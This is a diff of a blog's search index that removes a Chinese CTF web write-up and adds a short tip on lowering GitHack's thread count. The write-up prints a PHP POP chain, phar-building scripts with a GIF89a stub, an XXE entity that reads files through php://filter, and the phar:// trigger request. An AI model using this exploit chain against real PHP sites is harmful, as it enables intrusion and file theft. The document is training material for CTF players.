@@ -1,215 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>长城杯Web WP</title>
-    <url>/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><span id="more"></span>
-<p>访问8000端口，题目给了源码：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>php反序列的知识不懂可以先看：<a href="https://blog.csdn.net/qq_64201116/article/details/127234204">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;127234204</a><br>看到<code>**class的魔术方法**</code>第一时间想到反序列化<br>但是没有类似于<code>unserialize()</code>的反序列化函数<br>注意到函数<code>is_dir()</code>，这个函数可以触发<code>phar</code>协议，这个phar协议可以触发反序列化<br>phar反序列化知识补充：<a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/">http://home.ustc.edu.cn/~xjyuan&#x2F;blog&#x2F;2019&#x2F;11&#x2F;13&#x2F;phar-unserialize&#x2F;</a><br>但是phar需要有文件上传的点：于是找到了<code>/upload.php</code>这个功能点<br>因此思路就有了：</p>
-<pre class="line-numbers language-info" data-language="info"><code class="language-info">通过链子构造phar文件，上传phar文件后用phar协议读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>反序列化的链子很简单：</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">TheUse$__destruct() -->MyClass$__invoke-->MyClass$getdir()  //读取文件名称
-TheUse$__destruct() -->MyClass$__invoke-->MyClass$load()     //读取文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>构造反序列化链子：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
-<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
-EOF;
-$payload = new TheUse(new MyClass('./'), 'load', $xml);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h2><p>构造函数的时候<code>$xml</code>变量要用</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">$xml=&lt;&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EOF</span>
-<span class="token attr-name">&lt;?xml</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">encoding</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token attr-name">?</span><span class="token punctuation">></span></span> 
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=./flag.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
-EOF;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这种形式定义，不能直接放到构造函数里，我就是死在这</p>
-<h2 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h2><p>在xml中读取文件时要用绝对路径读取协议(这里用了php伪协议读取文件:  php filter读文件知识补充<a href="https://blog.csdn.net/qq_64201116/article/details/125926612">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;125926612</a>)：</p>
-<p>不用绝对路径的报错图：</p>
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/1.png"></p>
-<p>解决方法(使用绝对路径)：</p>
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/2.png"></p>
-<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>payload生成读取文件名的phar文件：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
- <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
-
-
-<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TheUse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getdir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/var/www/html/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// phar:[phar.phar][system_get_you_filename]/1.txt</span>
-<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>运行后上传phar文件<br>然后使用phar协议读取：</p>
-<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/3.png"></p>
-<p>可以看到flag的名称是<code>Maybe_flag_is_here.php</code><br>接下来读取flag：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">TheUse</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-     <span class="token keyword">private</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">,</span><span class="token variable">$con1</span><span class="token punctuation">,</span><span class="token variable">$con2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span> <span class="token operator">=</span> <span class="token variable">$con1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span> <span class="token operator">=</span> <span class="token variable">$con2</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$new</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token punctuation">;</span>
-         <span class="token variable">$new</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con1</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
- <span class="token keyword">class</span> <span class="token class-name-definition class-name">MyClass</span><span class="token punctuation">&#123;</span>
-     <span class="token keyword">private</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> 
-     <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"String conversion.\n"</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">,</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$param1</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">getdir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
-     <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">load</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-         <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-     <span class="token punctuation">&#125;</span>
- <span class="token punctuation">&#125;</span>
-
-
-<span class="token variable">$xml</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
-<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token delimiter important">?></span></span> 
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/Maybe_flag_is_here.php"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
-EOF;
-$payload = new TheUse(new MyClass('/var/www/html'), 'load', $xml);
-$phar = new Phar('phar.phar');
-$phar->startBuffering();
-$phar->setStub('GIF89a'.'<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>');
-$phar->setMetadata($payload);
-$phar->addFromString('1.txt','test'); // phar:[phar.phar][system_get_you_filename]/1.txt
-$phar->stopBuffering();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>依旧是把生成的phar文件上传,使用phar协议反序列化：</p>
-<pre class="line-numbers language-info" data-language="info"><code class="language-info">?f&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;phar.phar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/4.png"></p>
-<p>解码得到flag:<br><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/5.png"></p>
-<p>flag:<code>flag&#123;this-is-flag-for-you&#125;</code></p>
+    <title>Githack无法下载源码的问题</title>
+    <url>/2022/08/23/Githack%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>Githack有个好坑的地方<br />刚开始的时候总是下载不到泄露的<code>php文件</code><br />要扫很多次才有可能下载到,可是要是是真实环境,扫了两遍没有可能就真的觉得没有了,那如何解决呢？<br />于是我进了源码看一下<br /><img src="/images/1/1-1.png"><br />点击进入githack.py并编辑<br /><img src="/images/1/1-2.png"><br />把他线程改低一点就可以了,流量不够大就可以不被拒绝访问<br />就可以下载到源码</p>
 ]]></content>
       <categories>
         <category>CTF</category>
+        <category>Tools</category>
       </categories>
   </entry>
   <entry>
@@ -740,14 +539,529 @@ conn<span class="token operator">.</span><span class="token function">close</spa
       </categories>
   </entry>
   <entry>
-    <title>Githack无法下载源码的问题</title>
